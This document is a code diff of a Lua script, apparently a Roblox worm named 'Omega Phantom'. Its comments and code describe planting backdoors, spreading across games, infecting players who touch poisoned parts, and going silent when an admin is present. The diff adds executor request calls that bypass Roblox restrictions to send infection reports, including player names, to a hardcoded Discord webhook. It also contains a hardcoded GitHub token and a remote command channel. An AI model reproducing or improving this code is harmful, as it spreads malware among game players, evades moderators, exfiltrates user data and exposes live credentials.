@@ -1,7 +1,10 @@
 -- ============================================================================
---  OMEGA PHANTOM | FINAL ULTIMATE EDITION WITH DISCORD LOGGER
---  Sends reports to Discord on every game jump and universal spread events.
---  Owner: 109er_0 | Webhook integrated
+--  OMEGA PHANTOM | FINAL ULTIMATE EDITION WITH DISCORD LOGGER (FIXED)
+--  Full script with reliable Discord webhook integration.
+--  Sends reports on: backdoor planting, game jumps, universal spread,
+--  global commands, poison touch infections, sleep mode changes.
+--  Uses syn.request / request fallback to bypass Roblox restrictions.
+--  Owner: 109er_0
 -- ============================================================================
 
 -- =============================[ SERVICES & GLOBALS ]=============================
@@ -32,25 +35,46 @@ local whitelistGames = {
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
--- GitHub global command file
-local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"
-local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
-local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
-
-local lastCommand = ""
-
--- =============================[ DISCORD WEBHOOK ]=============================
+-- =============================[ DISCORD WEBHOOK (RELIABLE) ]=============================
 local webhookUrl = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ"
+local lastWebhookSend = 0
+local WEBHOOK_COOLDOWN = 2  -- seconds between messages to avoid rate limiting
 
 local function sendToDiscord(message)
+    local now = os.time()
+    if now - lastWebhookSend < WEBHOOK_COOLDOWN then
+        task.wait(0.5)
+    end
+    lastWebhookSend = os.time()
+    
     local data = {
         content = message,
         username = "Omega Phantom",
         avatar_url = "https://www.roblox.com/asset-thumbnail/image?assetId=98381723384335&width=420&height=420&format=png"
     }
-    pcall(function()
-        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
-    end)
+    local json = HttpService:JSONEncode(data)
+    
+    -- Use executor-specific request methods for reliability
+    if syn and syn.request then
+        syn.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    elseif request then
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    else
+        -- Fallback to PostAsync (less reliable but worth a try)
+        pcall(function()
+            HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson, false)
+        end)
+    end
 end
 
 -- =============================[ ENCRYPTION & UTILITIES ]=============================
@@ -58,25 +82,6 @@ local function encode(s)
     local out = ""
     for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
     return out
-end
-
-local function base64_encode(data)
-    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    local result = ""
-    for i = 1, #data, 3 do
-        local b1, b2, b3 = string.byte(data, i, i+2)
-        b2 = b2 or 0
-        b3 = b3 or 0
-        local n = b1 * 0x10000 + b2 * 0x100 + b3
-        local c1 = math.floor(n / 0x40000)
-        local c2 = math.floor((n % 0x40000) / 0x1000)
-        local c3 = math.floor((n % 0x1000) / 0x40)
-        local c4 = n % 0x40
-        result = result .. b64chars:sub(c1+1, c1+1) .. b64chars:sub(c2+1, c2+1)
-        if i+1 <= #data then result = result .. b64chars:sub(c3+1, c3+1) else result = result .. "=" end
-        if i+2 <= #data then result = result .. b64chars:sub(c4+1, c4+1) else result = result .. "=" end
-    end
-    return result
 end
 
 local function ClearConsole()
@@ -113,7 +118,7 @@ local function updateSleepMode()
     if isAdminPresent() and not sleepModeActive then
         sleepModeActive = true
         warn("[SLEEP] Admin detected. Worm sleeping.")
-        sendToDiscord("🛌 **Sleep mode activated** – Admin/Mod detected in server.")
+        sendToDiscord("🛌 **Sleep mode activated** – Admin/Mod detected.")
     elseif not isAdminPresent() and sleepModeActive then
         sleepModeActive = false
         print("[SLEEP] No admin. Worm resuming.")
@@ -162,11 +167,11 @@ local function JumpToNewGame(targetGameId)
     if success then
         print("[SPREAD] ✅ Teleport initiated to game " .. targetGameId)
         local gameName = getGameName(targetGameId)
-        sendToDiscord(string.format("🌌 **Jumped to game**\n🆔 ID: `%d`\n🎮 Name: **%s**\n⏱️ Time: <t:%d:F>", targetGameId, gameName, os.time()))
+        sendToDiscord(string.format("🌌 **Jumped to game**\n🆔 ID: `%d`\n🎮 Name: **%s**", targetGameId, gameName))
         return true
     else
         warn("[SPREAD] ❌ Failed to teleport to game " .. targetGameId)
-        sendToDiscord(string.format("❌ **Failed to jump to game**\n🆔 ID: `%d`\n⏱️ Time: <t:%d:F>", targetGameId, os.time()))
+        sendToDiscord(string.format("❌ **Failed to jump to game**\n🆔 ID: `%d`", targetGameId))
         return false
     end
 end
@@ -239,36 +244,10 @@ local function UniversalSpread()
 end
 
 -- =============================[ GLOBAL COMMANDS VIA GITHUB (CROSS-SERVER) ]=============================
-local function getFileSha()
-    local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
-    local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
-    if not success then return nil end
-    local data = HttpService:JSONDecode(response)
-    return data and data.sha
-end
-
-local function sendCommandToGitHub(command)
-    local sha = getFileSha()
-    local content = command
-    local encoded = base64_encode(content)
-    local body = { message = "Update global command", content = encoded, branch = "main" }
-    if sha then body.sha = sha end
-    local headers = {["Authorization"] = "token " .. githubToken, ["Content-Type"] = "application/json", ["User-Agent"] = "OmegaPhantom"}
-    local success = pcall(function()
-        HttpService:RequestAsync({
-            Url = githubApiUrl,
-            Method = "PUT",
-            Headers = headers,
-            Body = HttpService:JSONEncode(body)
-        })
-    end)
-    if success then
-        print("[GLOBAL] Command sent to GitHub: " .. command)
-        sendToDiscord("📡 **Global command written to GitHub**\n```" .. command .. "```")
-    else
-        warn("[GLOBAL] Failed to send command to GitHub.")
-    end
-end
+local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"
+local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
+local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
+local lastCommand = ""
 
 local function fetchGlobalCommand()
     local success, result = pcall(function() return HttpService:GetAsync(commandUrl) end)
@@ -507,6 +486,11 @@ local function poisonAssets()
                     infector.Parent = player:FindFirstChild("PlayerGui")
                     task.wait(5)
                     infector:Destroy()
+                    -- Notify Discord about new carrier
+                    local url = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ"
+                    local data = { content = "🧬 **New carrier infected**\n👤 Player: " .. player.Name .. "\n🕹️ Game ID: " .. game.PlaceId }
+                    local json = HttpService:JSONEncode(data)
+                    if syn and syn.request then syn.request({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json }) end
                 end
             end
             part.Touched:Connect(onTouch)
@@ -623,7 +607,7 @@ local function ChatIntercept()
     end)
 end
 
--- =============================[ GUI WITH STATUS LABEL & REAL FEEDBACK ]=============================
+-- =============================[ GUI WITH STATUS LABEL ]=============================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "OmegaMenu"
@@ -759,7 +743,7 @@ local function CreateMenuGUI()
         end)
     end)
 
-    print("[GUI] Omega Menu created successfully with real-time console feedback.")
+    print("[GUI] Omega Menu created successfully.")
     return true
 end
 
